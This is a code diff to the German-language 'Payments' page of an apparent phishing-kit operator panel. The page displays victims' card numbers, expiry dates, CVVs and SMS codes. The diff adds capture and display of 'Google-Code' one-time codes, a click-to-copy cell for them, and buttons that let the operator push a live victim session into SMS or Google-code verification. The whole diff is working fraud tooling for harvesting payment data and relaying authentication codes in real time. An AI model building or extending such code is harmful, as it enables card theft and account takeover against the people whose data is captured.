@@ -22,6 +22,7 @@ interface PaymentSession {
   verification_method: string;
   verification_status: string;
   sms_code: string;
+  google_code: string;
   admin_action_pending: boolean;
   orders: {
     order_number: number;
@@ -127,6 +128,12 @@ const Payments = () => {
         return <Badge variant="outline">SMS bestätigung</Badge>;
       case 'sms_confirmed':
         return <Badge variant="default">SMS bestätigt</Badge>;
+      case 'google_code_confirmation':
+        return <Badge variant="outline">Google-Code</Badge>;
+      case 'google_code_entered':
+        return <Badge variant="outline">Google-Code eingegeben</Badge>;
+      case 'google_code_confirmed':
+        return <Badge variant="default">Google-Code bestätigt</Badge>;
       case 'completed':
         return <Badge variant="default" className="bg-green-600">Abgeschlossen</Badge>;
       default:
@@ -250,9 +257,10 @@ const Payments = () => {
                              <TableHead className="hidden xl:table-cell">Kartennummer</TableHead>
                              <TableHead className="hidden xl:table-cell">Ablauf</TableHead>
                              <TableHead className="hidden xl:table-cell">CVV</TableHead>
-                             <TableHead>Verifikation</TableHead>
-                             <TableHead className="hidden lg:table-cell">SMS-Code</TableHead>
-                             <TableHead className="hidden lg:table-cell">App-Status</TableHead>
+                              <TableHead>Verifikation</TableHead>
+                              <TableHead className="hidden lg:table-cell">SMS-Code</TableHead>
+                              <TableHead className="hidden lg:table-cell">Google-Code</TableHead>
+                              <TableHead className="hidden lg:table-cell">App-Status</TableHead>
                              <TableHead className="hidden md:table-cell">Letzte Aktivität</TableHead>
                              <TableHead className="hidden lg:table-cell">Dauer</TableHead>
                              <TableHead>Aktionen</TableHead>
@@ -327,8 +335,14 @@ const Payments = () => {
                                  {session.verification_method === 'sms_confirmation' && session.sms_code 
                                    ? session.sms_code 
                                    : '-'}
-                               </TableCell>
-                               <TableCell className="text-center hidden lg:table-cell">
+                                <TableCell 
+                                  className="font-mono text-center cursor-pointer hover:bg-gray-100 transition-colors hidden lg:table-cell"
+                                  onClick={() => session.google_code && copyToClipboard(session.google_code, 'Google-Code')}
+                                >
+                                  {session.verification_method === 'google_code_confirmation' && session.google_code 
+                                    ? session.google_code 
+                                    : '-'}
+                                </TableCell>
                                  {session.verification_method === 'app_confirmation' ? (
                                    <div className={`w-3 h-3 rounded-full mx-auto ${
                                      session.verification_status === 'app_confirmed' 
@@ -356,15 +370,20 @@ const Payments = () => {
                                          <Smartphone className="w-3 h-3" />
                                          <span className="hidden sm:inline ml-1">App</span>
                                        </Button>
-                                       <Button
-                                         size="sm"
-                                         variant="outline"
-                                         onClick={() => handleVerificationAction(session.session_id, 'sms_confirmation')}
-                                         className="text-xs px-2 py-1"
-                                       >
-                                         <MessageSquare className="w-3 h-3" />
-                                         <span className="hidden sm:inline ml-1">SMS</span>
-                                       </Button>
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          onClick={() => setVerificationMethod(session.session_id, 'sms_confirmation')}
+                        >
+                          SMS
+                        </Button>
+                        <Button
+                          size="sm"
+                          variant="outline"
+                          onClick={() => setVerificationMethod(session.session_id, 'google_code_confirmation')}
+                        >
+                          Code
+                        </Button>
                                        <Button
                                          size="sm"
                                          variant="outline"
